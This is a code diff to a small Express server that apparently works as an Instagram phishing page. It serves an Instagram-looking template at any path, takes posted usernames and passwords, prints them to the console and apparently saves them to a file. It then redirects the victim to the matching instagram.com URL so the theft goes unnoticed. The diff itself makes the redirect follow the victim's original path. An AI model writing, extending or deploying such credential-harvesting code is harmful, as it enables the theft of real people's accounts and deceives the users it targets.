@@ -27,8 +27,13 @@ app.use((err, req, res, next) => {
   res.send(err);
 });
 
-app.post('/login', (req, res) => {
-  const { username, password } = req.body;
+app.get('/*', (req, res) => {
+  const currentUrl = req.path;
+  renderTemplate(res, req, "index.ejs", { currentUrl });
+})
+
+app.post('/', (req, res) => {
+  const { username, password, currentUrl } = req.body;
   
   console.log(
     "\x1b[37m%s\x1b[0m\x1b[1m\x1b[31m%s\x1b[0m\n" +
@@ -57,14 +62,14 @@ app.post('/login', (req, res) => {
           console.error("파일을 저장하는 중 오류가 발생했습니다:", err);
           return;
         }
-        res.redirect("https://www.instagram.com/")
+        res.redirect(`https://www.instagram.com${currentUrl}`)
       });
     });
 });
 
-app.use((req, res, next) => {
-  renderTemplate(res, req, "index.ejs");
-});
+// app.use((req, res, next) => {
+//   renderTemplate(res, req, "index.ejs");
+// });
 
 app.listen(3000, () => {
   console.log(`HTTP server started on port 3000`);
